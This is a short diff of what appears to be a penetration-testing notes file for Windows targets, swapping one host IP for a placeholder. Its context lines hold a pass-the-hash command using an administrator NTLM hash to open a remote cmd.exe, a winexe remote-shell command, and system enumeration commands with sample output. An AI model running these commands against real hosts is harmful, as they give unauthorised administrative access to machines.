@@ -536,7 +536,7 @@ pth-winexe -U domain/administrator%e0fb1fb85756c24235ff238cbe81fe00 //x.x.x.x cm
 
 
 #Execute shell (will need password)
-winexe -U Administrator //10.10.10.82 cmd.exe
+winexe -U Administrator //x.x.x.x cmd.exe
 
 
 
@@ -735,4 +735,6 @@ echo %logonserver%
 systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
 OS Name:                   Microsoft Windows Server 2012 R2 Standard
 OS Version:                6.3.9600 N/A Build 9600
+
+
 
